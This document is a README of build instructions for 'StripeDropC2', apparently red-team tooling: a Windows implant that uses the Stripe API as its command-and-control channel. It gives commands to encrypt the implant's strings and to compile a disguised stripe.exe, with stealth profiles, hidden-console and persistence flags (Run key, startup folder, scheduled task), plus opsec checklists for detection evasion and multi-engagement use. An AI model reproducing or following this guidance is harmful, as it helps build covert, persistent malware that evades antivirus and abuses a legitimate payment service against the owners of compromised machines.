# Build Instructions

Complete step-by-step guide for building the StripeDropC2 implant.

## CRITICAL: Read This First

**The implant will NOT work if you skip the encryption step!**

StripeDropC2 encrypts sensitive strings (including your Stripe API key) in the compiled binary. You MUST:
1. Configure your API key in BOTH `operator/c2_config.py` AND `operator/regenerate_key.py`
2. Run `operator/regenerate_key.py` to generate a new XOR encryption key and encrypt all sensitive strings
3. Then build the implant

**What does operator/regenerate_key.py do?**
- Generates a random XOR encryption key
- Encrypts your Stripe API key and protocol strings (heartbeat, c2-pending, etc.)
- Updates the encrypted byte arrays directly in `Implant.cs`
- This makes static analysis much harder and ensures each build is unique

**IMPORTANT:** The API key must be identical in both:
- `operator/c2_config.py` (line 10) - Used by the C2 operator
- `operator/regenerate_key.py` (line 28) - Used to encrypt into the implant

If these keys don't match, the implant will fail to authenticate!

**For detailed explanation, see: [ENCRYPTION_WORKFLOW.md](ENCRYPTION_WORKFLOW.md)**

## Quick Build (5 Minutes)

### 1. Get Your Stripe API Key

```
1. Sign up at: https://stripe.com/
2. Go to: https://dashboard.stripe.com/test/apikeys
3. Copy your test mode secret key (starts with sk_test_...)
```

### 2. Configure API Keys (BOTH FILES!)

**Edit `operator/c2_config.py` (line 10):**
```python
API_KEY = "sk_test_51ABC..." # ← Paste your key here
```

**Edit `operator/regenerate_key.py` (line 28):**
```python
YOUR_STRIPE_API_KEY = "sk_test_51ABC..." # ← Paste the SAME key here
```

**CRITICAL: Both files must have IDENTICAL API keys!**
- The operator (`operator/c2_config.py`) uses it to communicate with Stripe
- The encryption script (`operator/regenerate_key.py`) embeds it into the implant
- If they don't match, the implant cannot authenticate

### 3. Encrypt Strings

```bash
cd operator
python3 regenerate_key.py
cd ..
```

**You should see:**
```
[*] Generated new XOR key: 0xA3, 0xB2, ...
[+] Regenerated encryption for 18 strings
[+] ../implant/Implant.cs updated successfully
```

### 4. Build Implant

**Method 1: Use Implant.csproj settings (Recommended)**

The project file already configures self-contained, single-file, trimmed, and compressed output. Simply run:

```bash
cd implant
cd implant && dotnet publish Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
cd ..
```

**Method 2: Explicit self-contained command**

If you prefer to specify all options explicitly:

```bash
cd implant
cd implant && dotnet publish -c Release -r win-x64 --self-contained true \
-p:PublishSingleFile=true -p:PublishTrimmed=true \
-p:EnableCompressionInSingleFile=true \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
cd ..
```

**Note:** Both methods produce the same output - the csproj already sets these options by default.

**Output location:**
```
implant/bin/Release/net10.0/win-x64/publish/stripe.exe
```

### 5. Verify Build

```bash
ls -lh implant/bin/Release/net10.0/win-x64/publish/stripe.exe
```

Expected: ~15-25 MB binary

## Build Profiles

Choose based on your operational needs. All commands can be run using either method:

**Method A:** Rely on implant/Implant.csproj settings (shorter)
**Method B:** Explicit flags (longer but shows all options)

### Low Stealth (Fast Testing)

**Method A:**
```bash
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_LOW"
```

**Method B:**
```bash
cd implant && dotnet publish -c Release -r win-x64 --self-contained true \
-p:PublishSingleFile=true -p:PublishTrimmed=true \
-p:EnableCompressionInSingleFile=true \
-p:DefineConstants="STEALTH_LOW"
```

- Poll: 2-5 seconds
- Response: Instant
- Detection Risk: Very High
- Use: Lab testing only

### Balanced (Recommended)

**Method A:**
```bash
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
```

**Method B:**
```bash
cd implant && dotnet publish -c Release -r win-x64 --self-contained true \
-p:PublishSingleFile=true -p:PublishTrimmed=true \
-p:EnableCompressionInSingleFile=true \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
```

- Poll: 5-15 seconds
- Response: Fast (~10s)
- Detection Risk: Moderate
- Use: Most engagements

### High Stealth

**Method A:**
```bash
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_HIGH;HIDE_CONSOLE;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

**Method B:**
```bash
cd implant && dotnet publish -c Release -r win-x64 --self-contained true \
-p:PublishSingleFile=true -p:PublishTrimmed=true \
-p:EnableCompressionInSingleFile=true \
-p:DefineConstants="STEALTH_HIGH;HIDE_CONSOLE;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

- Poll: 30-60 seconds
- Response: Slow (~45s)
- Detection Risk: Low
- Use: Monitored networks

### Maximum Stealth (Paranoid)

**Method A:**
```bash
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_PARANOID;HIDE_CONSOLE;PERSIST_REGISTRY;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

**Method B:**
```bash
cd implant && dotnet publish -c Release -r win-x64 --self-contained true \
-p:PublishSingleFile=true -p:PublishTrimmed=true \
-p:EnableCompressionInSingleFile=true \
-p:DefineConstants="STEALTH_PARANOID;HIDE_CONSOLE;PERSIST_REGISTRY;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
```

- Poll: 2-5 minutes
- Response: Very slow (~3.5min)
- Detection Risk: Very Low
- Use: Maximum OpSec required

## Build Flags Explained

### Stealth Profiles (Choose ONE)
- `STEALTH_LOW` - Fast, easily detected
- `STEALTH_BALANCED` - Default, moderate
- `STEALTH_HIGH` - Slow, stealthy
- `STEALTH_PARANOID` - Very slow, near-invisible

### Persistence (Optional, can combine)
- `PERSIST_REGISTRY` - HKCU Run key
- `PERSIST_STARTUP` - Startup folder shortcut 
- `PERSIST_TASK` - Scheduled task (daily 9 AM)

### OpSec Flags
- `HIDE_CONSOLE` - No visible window (required for covert)
- `ALLOW_DYNAMIC_CONFIG` - Runtime config changes (recommended)

## Alternative: Modify implant/Implant.csproj Directly

Instead of passing `-p:DefineConstants="..."` on every build command, you can edit the default configuration in `implant/Implant.csproj` (line 60):

**Original:**
```xml
<DefineConstants>HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG</DefineConstants>
```

**Example modifications:**

**For high stealth:**
```xml
<DefineConstants>STEALTH_HIGH;HIDE_CONSOLE;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG</DefineConstants>
```

**For maximum stealth:**
```xml
<DefineConstants>STEALTH_PARANOID;HIDE_CONSOLE;PERSIST_REGISTRY;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG</DefineConstants>
```

**For quick testing (low stealth):**
```xml
<DefineConstants>STEALTH_LOW;HIDE_CONSOLE;ALLOW_DYNAMIC_CONFIG</DefineConstants>
```

After editing `implant/Implant.csproj`, you can build with a simple command:
```bash
dotnet publish implant/Implant.csproj -c Release -r win-x64
```

**Note:** Command-line `-p:DefineConstants` will override the values in `implant/Implant.csproj`, so if you specify both, the command-line version wins.

## Complete Workflow

Every time you build:

```bash
# 1. Edit BOTH config files with your API key (must be identical!)
nano operator/c2_config.py         # Update API_KEY on line 10
nano operator/regenerate_key.py    # Update YOUR_STRIPE_API_KEY on line 28

# 2. Regenerate encryption
python3 operator/regenerate_key.py

# 3. Build with desired profile
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;ALLOW_DYNAMIC_CONFIG"

# 4. Binary is ready
ls -lh bin/Release/net10.0/win-x64/publish/stripe.exe
```

## Common Build Errors

### Error: "operator/regenerate_key.py not run"

**Symptom:** Implant compiles but has all zeros in encrypted byte arrays

**Solution:** Run `python3 operator/regenerate_key.py` before building

### Error: "API key authentication failed"

**Symptom:** Implant runs but doesn't connect

**Solution:** 
- Verify API key in BOTH `operator/c2_config.py` AND `operator/regenerate_key.py` 
- Both files must have IDENTICAL keys
- Must be TEST mode key (sk_test_...)
- After updating, re-run `python3 operator/regenerate_key.py` and rebuild

### Error: ".NET SDK not found"

**Symptom:** `dotnet` command not recognized

**Solution:** Install .NET 10.0 SDK from https://dotnet.microsoft.com/download/dotnet/10.0

### Error: "Build failed with errors"

**Symptom:** Compilation errors

**Solution:**
```bash
# Clean and rebuild
dotnet clean
rm -rf bin/ obj/
python3 operator/regenerate_key.py
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE"
```

## Verifying Your Build

### Check Binary Size
```bash
ls -lh bin/Release/net10.0/win-x64/publish/stripe.exe
```
Should be: 15-25 MB (if much larger, trimming failed)

### Check It Runs (Lab Only!)
```powershell
# In isolated Windows VM
.\stripe.exe
# Should start silently (if HIDE_CONSOLE enabled)
# Check Task Manager for "stripe.exe" process
```

### Check Strings Are Encrypted
```bash
strings bin/Release/net10.0/win-x64/publish/stripe.exe | grep "sk_test"
# Should return NOTHING (API key is encrypted)

strings bin/Release/net10.0/win-x64/publish/stripe.exe | grep "heartbeat"
# Should return NOTHING (protocol strings encrypted)
```

## Build Tips

### Automated Build Script

Create `build.sh`:
```bash
#!/bin/bash
set -e

echo "[*] Regenerating encryption key..."
python3 operator/regenerate_key.py

echo "[*] Building implant..."
dotnet publish implant/Implant.csproj -c Release -r win-x64 \
-p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"

echo "[+] Build complete!"
ls -lh bin/Release/net10.0/win-x64/publish/stripe.exe
```

Make executable:
```bash
chmod +x build.sh
./build.sh
```

### Version Your Builds

```bash
# After building
mkdir -p builds
timestamp=$(date +%Y%m%d_%H%M%S)
cp bin/Release/net10.0/win-x64/publish/stripe.exe \
builds/stripe_${timestamp}.exe
```

### Clean Builds

```bash
# Before important builds
dotnet clean
rm -rf bin/ obj/
python3 operator/regenerate_key.py
dotnet publish ...
```

## Build Size Optimization

Already optimized:
- Single-file deployment
- Self-contained (no runtime needed)
- Full IL trimming
- Ready-to-run disabled
- Debug symbols stripped

Size breakdown:
- Base .NET runtime: ~12 MB
- HttpClient + JSON: ~2 MB
- Your code: ~1 MB
- **Total: ~15 MB**

Further reduction requires:
- Native AOT (not worth complexity)
- Custom runtime trimming (risky)
- Packing/compression (defeats AV more)

## Security Reminders

### Before Each Build
- [ ] Update API key in BOTH `operator/c2_config.py` AND `operator/regenerate_key.py`
- [ ] Verify both files have IDENTICAL API keys
- [ ] Run `python3 operator/regenerate_key.py`
- [ ] Verify different encryption key generated than last build
- [ ] Confirm operator and implant are using the same Stripe key

### After Building
- [ ] Verify binary created
- [ ] Check strings are encrypted
- [ ] Test in isolated environment
- [ ] Store build securely
- [ ] Never commit binary to Git

### During Operations
- [ ] Regenerate for each engagement
- [ ] Use different Stripe accounts
- [ ] Rotate keys frequently
- [ ] Monitor Stripe dashboard
- [ ] Clean up after operations

## Related Documentation

- **[ENCRYPTION_WORKFLOW.md](ENCRYPTION_WORKFLOW.md)** - Detailed encryption explanation
- **[INSTALLATION.md](INSTALLATION.md)** - Full setup guide
- **[USAGE.md](USAGE.md)** - Operational guide
- **[SECURITY.md](SECURITY.md)** - OpSec guidelines

---

**Build → Test → Deploy → Cleanup**

Always verify in a lab before operational deployment!
